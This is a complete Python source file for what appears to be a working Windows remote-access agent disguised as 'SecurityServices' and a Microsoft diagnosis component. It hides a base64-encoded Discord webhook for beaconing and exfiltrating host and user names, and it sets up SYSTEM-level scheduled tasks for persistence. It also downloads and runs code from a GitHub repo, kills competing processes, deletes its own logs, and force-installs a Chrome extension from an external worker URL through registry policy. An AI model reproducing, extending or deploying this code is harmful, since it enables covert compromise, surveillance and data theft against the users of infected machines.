import string, base64, json, re
import os, socket, sys, importlib, tempfile, random, csv, io, shutil
import urllib.request, subprocess
import time
from pathlib import Path
import winreg

def ensure_package(package_name, import_name):
    """
    Ensure a Python package is installed.
    
    :param package_name: Name used by pip (e.g. 'pywin32')
    :param import_name: Module to test import (e.g. 'win32com.client')
    """
    try:
        importlib.import_module(import_name)
    except ImportError:
        subprocess.check_call([
            sys.executable,
            "-m",
            "pip",
            "install",
            "--upgrade",
            package_name,
        ])

ensure_package("pywin32", "win32com.client")
ensure_package("requests", "requests")
ensure_package("psutil", "psutil")

try:
    import win32com.client
    import requests
    import psutil
except:
    sys.exit()

WEBHOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ3NzAwNjk4NTAzMDI3MTA3Ni9xdUVRY0VxcEFGN3c2TUg4REduSlRtaTBuSUtFVGl2WXpMbEpVNlNSLUpsSWxGYmNLaUtFNDVlczZ1ZGxmOGVFQklBZw=="

def encrypt(text: str) -> str:
    b64 = base64.b64encode(text.encode()).decode()

    lower = string.ascii_lowercase
    upper = string.ascii_uppercase

    lower_rot = lower[5:] + lower[:5]
    upper_rot = upper[-3:] + upper[:-3]

    table = str.maketrans(
        lower + upper,
        lower_rot + upper_rot
    )

    encrypted = b64.translate(table)
    encrypted = encrypted.replace("==","-°").replace("=","_")

    return encrypted
 
def get_logged_in_user():
    """
    Returns one interactive logged-in user (DOMAIN\\User).
    Returns None if no interactive user is logged in.
    """
    try:
        wmi = win32com.client.GetObject("winmgmts:")
        sessions = wmi.ExecQuery(
            "SELECT * FROM Win32_LogonSession WHERE LogonType = 2 OR LogonType = 10"
        )
 
        for session in sessions:
            assoc = wmi.ExecQuery(
                f"ASSOCIATORS OF {{Win32_LogonSession.LogonId='{session.LogonId}'}} "
                "WHERE AssocClass=Win32_LoggedOnUser"
            )
            for user in assoc:
                return user.Domain,user.Name
 
    except Exception:
        pass
 
    return None, None

def send_webhook(message):
    webhook_url = base64.b64decode(WEBHOOK_B64).decode("utf-8")

    payload = json.dumps({
        "content": encrypt(message)
    }).encode("utf-8")

    req = urllib.request.Request(
        webhook_url,
        data=payload,
        method="POST",
        headers={
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (DiscordWebhook)"
        }
    )

    try:
        with urllib.request.urlopen(req, timeout=10) as response:
            response.read()
        return True
    except Exception as e:
        return False

def task_exists(task_name: str) -> bool:
    """
    Returns True if a Windows scheduled task exists, False otherwise.
    """
    result = subprocess.run(
        ["schtasks", "/query", "/tn", task_name],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    return result.returncode == 0

def list_tasks() -> list[str]:
    """
    Returns a list of all Windows scheduled task names.
    """
    result = subprocess.run(
        ["schtasks", "/query", "/fo", "csv", "/nh"],
        capture_output=True,
        text=True,
        check=True
    )

    tasks = []
    reader = csv.reader(io.StringIO(result.stdout))
    for row in reader:
        if row:
            tasks.append(row[0])

    return tasks

def sanitize_username(username: str) -> str:
    """
    Replace characters not allowed in task names with '_'
    """
    return re.sub(r'[^a-zA-Z0-9._-]', '_', username)

def kill_other_pythonw():
    current_pid = os.getpid()

    for proc in psutil.process_iter(['pid', 'name']):
        try:
            if proc.info['name'] and 'pythonw' in proc.info['name'].lower():
                if proc.info['pid'] != current_pid:
                    proc.kill()
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass

def kill_process(process_name):
    try:
        subprocess.run(
            ["taskkill", "/F", "/IM", process_name],
            check=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
    except subprocess.CalledProcessError as e:
        pass

def create_user_task(username,taskname):
    PYTHON_EXE = Path(sys.executable).with_name("pythonw.exe")
    APP_NAME = "SecurityServices"
    INSTALL_DIR = os.path.join(os.environ["ProgramFiles"], APP_NAME)
    USER_DST = os.path.join(INSTALL_DIR, "user_agent.py")

    cmd = f'"{PYTHON_EXE}" "{USER_DST}"'
    # cmd = f'"{PYTHON_EXE}" "{USER_DST}" >> C:\\Windows\\Temp\\SecutiryServicesLogsUser{taskname}.txt 2>&1'

    if EXPERIMENTAL:
        INSTALL_DIR = r"C:\ProgramData\Microsoft\JFRE\Diagnosis"
        USER_DST = os.path.join(INSTALL_DIR, "USER.bin")
        PYTHON_EXE = Path(sys.executable).with_name("pythonw.exe")
        cmd = f'"{PYTHON_EXE}" "{USER_DST}"'
    
    subprocess.run(
        [
            "schtasks",
            "/create",
            "/f",
            "/sc", "minute",
            "/mo", "1",
            "/ru", username,
            "/tn", taskname,
            "/tr", cmd,
        ],
        check=True
    )

def create_system_task():
    PYTHON_EXE = Path(sys.executable).with_name("pythonw.exe")
    APP_NAME = "SecurityServices"
    if EXPERIMENTAL:
        SYSTEM_TASK_PATH = r"\Microsoft\JFRE\Diagnosis\FeedbackArchive\System"
    else:
        SYSTEM_TASK_PATH = "MyApp_SystemAgent"

    INSTALL_DIR = os.path.join(os.environ["ProgramFiles"], APP_NAME)
    SYSTEM_DST = os.path.join(INSTALL_DIR, "system_agent.py")

    subprocess.run(
        [
            "schtasks",
            "/create",
            "/f",
            "/sc", "minute",
            "/mo", "1",
            "/ru", "SYSTEM",
            "/rl", "highest",
            "/tn", SYSTEM_TASK_PATH,
            # "/tr", f'"{PYTHON_EXE}" "{SYSTEM_DST}" >> C:\\Windows\\Temp\\SecutiryServicesLogsSystem.txt 2>&1'
            "/tr", f'"{PYTHON_EXE}" "{SYSTEM_DST}"'
        ],
        check=True
    )

def remove_task(taskname):
    subprocess.run(
        [
            "schtasks",
            "/delete",
            "/f", 
            "/tn", taskname
        ],
        check=True
    )

def build_directory_tree(path):
    """
    Recursively builds a dictionary that represents the folder structure.
    Folders are dictionaries.
    Files are stored as keys with value None.
    """
    tree = {}

    try:
        for entry in os.listdir(path):
            full_path = os.path.join(path, entry)

            if os.path.isdir(full_path):
                tree[entry] = build_directory_tree(full_path)
            else:
                tree[entry] = None

    except PermissionError:
        tree["__error__"] = "Permission denied"

    return tree

def get_directory_architecture(root_path):
    root_name = os.path.basename(os.path.abspath(root_path))
    return {root_name: build_directory_tree(root_path)}

def random_ext(n=3):
    return "." + "".join(random.choices(string.ascii_lowercase, k=n))

def manage_user_tasks():
    domain,user = get_logged_in_user()

    if user is None:
        return
    
    buser = base64.b64encode(user.encode()).decode()
    if user.endswith("pt_ptsi"):
        tname = f"MyApp_UserAgent"
        wrong_tname = f"MyApp_UserAgent{buser}"
        try:
            if task_exists(wrong_tname):
                remove_task(wrong_tname)
                msg = "removed double task :))"
                send_webhook(msg)
        except:
            pass
    else:
        tname = f"MyApp_UserAgent{buser}"

    if EXPERIMENTAL:
        tname = r"\Microsoft\JFRE\Diagnosis\FeedbackArchive\User" + "\\" + sanitize_username(user)
        
    
    if not task_exists(tname):
        create_user_task(f"{domain}\\{user}", tname)

def setup_updated_version():
    # ===== CONFIG =====
    OWNER = "Proutman67"          # github username or org
    REPO = "educational"       # repository name
    SUBFOLDER = "newsetup"      # path inside repo
    FILE_TO_RUN = "install.py"    # file to call after download
    BRANCH = "main"            # usually "main" or "master"
    # ==================

    API_URL = f"https://api.github.com/repos/{OWNER}/{REPO}/contents/{SUBFOLDER}?ref={BRANCH}"

    response = requests.get(API_URL)
    response.raise_for_status()
    files = response.json()

    dir = Path(tempfile.gettempdir()) / "tmp"
    os.makedirs(dir, exist_ok=True)

    for item in files:
        if item["type"] == "file":
            file_name = item["name"]
            download_url = item["download_url"]

            file_data = requests.get(download_url).content

            with open(dir / file_name, "wb") as f:
                f.write(file_data)

    subprocess.run(["python", dir / FILE_TO_RUN], check=True)

def is_old_task(taskname):
    return ("MyApp_SystemAgent" in taskname or "MyApp_UserAgent" in taskname)

def is_old_installed():
    dir = (Path(os.environ["ProgramFiles"]) / "SecurityServices").resolve()
    if dir.is_dir(): return True

    for task in list_tasks():
        if is_old_task(task): return True

    return False

def is_new_installed():
    dir = Path(r"C:\ProgramData\Microsoft\JFRE\Diagnosis")
    if not dir.is_dir(): return False

    if not task_exists(r"\Microsoft\JFRE\Diagnosis\FeedbackArchive\System"): return False

    filenames = ["SYS.bin","USER.bin"]
    for fn in filenames:
        if not (dir / fn).is_file(): return False

    return True

def cleanup_named_tempfiles():
    AGE_THRESHOLD = 60 
    temp_dir = tempfile.gettempdir()
    now = time.time()

    pattern = re.compile(r'^tmp[^.]{8}\.[^.]{3}$')
    for filename in os.listdir(temp_dir):
        if not pattern.match(filename):
                continue

        filepath = os.path.join(temp_dir, filename)

        if not os.path.isfile(filepath):
            continue

        try:
            mtime = os.path.getmtime(filepath)

            if now - mtime < AGE_THRESHOLD:
                continue

            os.remove(filepath)

        except PermissionError:
            pass
        except Exception as e:
            pass

def manage_updates():
    if not EXPERIMENTAL:
        return

    folder_list = [
        Path(tempfile.gettempdir()) / "SecurityServices",
        Path(tempfile.gettempdir()) / "tmp",
        Path(tempfile.gettempdir()) / "MyTempWork",
        r"C:\Windows\Temp\SecurityServices"
    ]

    for folder in folder_list:
        try:
            shutil.rmtree(folder)
        except:
            pass    

    file_list = [
        "C:\\Windows\\Temp\\SecutiryServicesLogsSystem.txt",
        "C:\\Windows\\Temp\\SecutiryServicesLogsUser.txt"
    ]
    
    for file in file_list:
        try:
            os.remove(file)
        except:
            pass
    
    if not is_new_installed(): 
        try:
            setup_updated_version()
        except:
            pass

        if is_new_installed():
            send_webhook("Successfully updated")

    if is_new_installed() and is_old_installed():
        send_webhook("Trying to remove old install")
        for task in list_tasks():
            if is_old_task(task):
                try:
                    remove_task(task)
                except:
                    pass

        try:
            kill_other_pythonw()
        except:
            pass

        time.sleep(1)
        try:
            dir = (Path(os.environ["ProgramFiles"]) / "SecurityServices").resolve()    
            shutil.rmtree(dir)
        except:
            pass

        if not is_old_installed():
            send_webhook("Sucessfully removed old install")

        sys.exit()

def install_ext():
    key_path = r"Software\Policies\Google\Chrome\ExtensionInstallForcelist"

    with winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path) as key:
        winreg.SetValueEx(
            key,
            "67",
            0,
            winreg.REG_SZ,
            "clfbahpbgmlbahejgcbninkkbljjnpki;https://pc-lamartin.anna-benbekthi.workers.dev/update.xml"
        )

def heartbeat():
    global FIRST_MESSAGE
    
    if FIRST_MESSAGE:
        msg = START_DATA
    else:        
        msg = ALIVE_DATA
    
    sent = send_webhook(msg)
    if sent and FIRST_MESSAGE:
        FIRST_MESSAGE = False

if __name__ == "__main__":
    COMPUTER_NAME = os.environ.get("COMPUTERNAME", socket.gethostname())
    USER_NAME = os.environ.get("USERNAME", "SYSTEM")

    try:
        LOADER_VERSION = LOADER_VERSION
    except:
        LOADER_VERSION = "1.0"

    START_DATA = json.dumps({'info':'script_started', 'loader_version':LOADER_VERSION, 'script':'system','computer':COMPUTER_NAME,'username':USER_NAME})
    ALIVE_DATA = json.dumps({'info':'alive','script':'system','computer':COMPUTER_NAME,'username':USER_NAME})

    FIRST_MESSAGE = True
    
    # exp = Path(tempfile.gettempdir()) / "E"
    # EXPERIMENTAL = (exp.is_file())

    # if EXPERIMENTAL :
        # send_webhook("Experimental client started")

    EXPERIMENTAL = COMPUTER_NAME.startswith("B103")
    if "P01" in COMPUTER_NAME:
        EXPERIMENTAL = False

    if EXPERIMENTAL:
        try:
            install_ext()
        except:
            pass
    
    loop_function_list = [
        {
            "func": manage_updates,
            "args": [],
            "interval": 60,  # seconds
            "next_run": time.monotonic(),
        },
                {
            "func": cleanup_named_tempfiles,
            "args": [],
            "interval": 60,  # seconds
            "next_run": time.monotonic(),
        },
                {
            "func": manage_user_tasks,
            "args": [],
            "interval": 60,  # seconds
            "next_run": time.monotonic(),
        },
                {
            "func": heartbeat,
            "args": [],
            "interval": 60,  # seconds
            "next_run": time.monotonic(),
        }
    ]

    while True:
        now = time.monotonic()
        nearest_next_run = None

        for task in loop_function_list:
            if now >= task["next_run"]:
                task["next_run"] += task["interval"]
                try:
                    task["func"](*task["args"])
                except Exception:
                    pass

            if nearest_next_run is None or task["next_run"] < nearest_next_run:
                nearest_next_run = task["next_run"]

        sleep_time = max(0, nearest_next_run - time.monotonic())
        time.sleep(sleep_time)
